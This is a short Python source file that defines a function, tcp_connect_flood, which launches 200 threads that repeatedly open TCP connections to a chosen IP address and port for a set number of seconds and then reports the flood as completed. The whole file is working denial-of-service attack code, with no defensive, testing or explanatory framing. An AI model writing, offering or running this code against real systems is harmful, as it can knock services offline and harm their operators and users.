import socket
import threading
import time

def tcp_connect_flood(target_ip: str, target_port: int, duration: int = 5):

    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((target_ip, target_port))
            except:
                pass
            finally:
                try:
                    s.close()
                except:
                    pass

    threads = []
    for _ in range(200):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return {
        "status": "TCP Connect Flood completed",
        "target": f"{target_ip}:{target_port}",
        "duration_seconds": duration,
    }
